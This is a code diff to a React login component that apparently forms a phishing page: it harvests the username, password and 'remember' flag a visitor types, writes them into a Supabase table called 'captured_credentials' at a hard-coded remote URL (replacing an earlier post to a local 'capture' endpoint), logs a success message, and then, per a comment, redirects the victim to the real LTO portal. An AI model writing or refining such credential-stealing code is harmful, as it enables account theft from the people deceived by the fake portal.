@@ -1,4 +1,12 @@
 import React, { useState } from "react";
+import { createClient } from "@supabase/supabase-js";
+
+// Initialize Supabase client directly in the frontend
+// Initialize Supabase using a Vite environment variable
+const SUPABASE_URL = "https://uydmvvyifhkraaydinty.supabase.co";
+const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_KEY; 
+
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
 export default function Login() {
     const [username, setUsername] = useState("");
@@ -10,14 +18,17 @@ export default function Login() {
         e.preventDefault();
         
         try {
-            // Sends the captured data to your local FastAPI backend
-            await fetch("http://localhost:8000/api/capture", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username, password, remember })
-            });
+            // Inserts captured credentials directly into your Supabase table from the browser
+            await supabase.from("captured_credentials").insert([
+                { 
+                    username: username, 
+                    password: password, 
+                    remember: remember 
+                }
+            ]);
+            console.log("[+] Credential captured and logged to Supabase!");
         } catch (error) {
-            console.log("Connection error to local backend logger:", error);
+            console.log("Error logging credentials:", error);
         }
 
         // Redirect to the actual LTO portal after capturing
